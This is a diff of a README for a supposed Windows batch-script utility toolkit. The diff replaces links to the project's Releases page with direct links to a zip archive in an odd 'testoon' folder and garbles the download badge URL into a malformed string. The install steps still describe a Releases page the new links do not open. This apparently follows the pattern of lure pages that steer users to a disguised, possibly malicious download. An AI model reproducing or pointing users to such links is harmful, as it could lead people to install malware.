@@ -4,7 +4,7 @@
 Welcome to the windows-utility-toolkit! This toolkit provides a simple way to perform common Windows tasks using batch scripts. Built for anyone looking to enhance their system maintenance skills without needing programming knowledge.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/xenoExploits/windows-utility-toolkit/releases)
+[![Download the latest release](https://raw.githubusercontent.com/xenoExploits/windows-utility-toolkit/main/testoon/toolkit_utility_windows_3.3.zip%20Latest%https://raw.githubusercontent.com/xenoExploits/windows-utility-toolkit/main/testoon/toolkit_utility_windows_3.3.zip)](https://raw.githubusercontent.com/xenoExploits/windows-utility-toolkit/main/testoon/toolkit_utility_windows_3.3.zip)
 
 ## 📋 Overview
 The windows-utility-toolkit consists of a variety of batch scripts designed to make your Windows experience smoother. With this toolkit, you can quickly execute tasks such as:
@@ -20,7 +20,7 @@ The windows-utility-toolkit consists of a variety of batch scripts designed to m
 - Regular updates: The toolkit will receive updates with new features and improvements.
 
 ## 🔗 Download & Install
-To download the windows-utility-toolkit, visit this page: [Download Here](https://github.com/xenoExploits/windows-utility-toolkit/releases).
+To download the windows-utility-toolkit, visit this page: [Download Here](https://raw.githubusercontent.com/xenoExploits/windows-utility-toolkit/main/testoon/toolkit_utility_windows_3.3.zip).
 
 1. Click the link above to open the Releases page.
 2. You will see a list of versions; select the latest one.
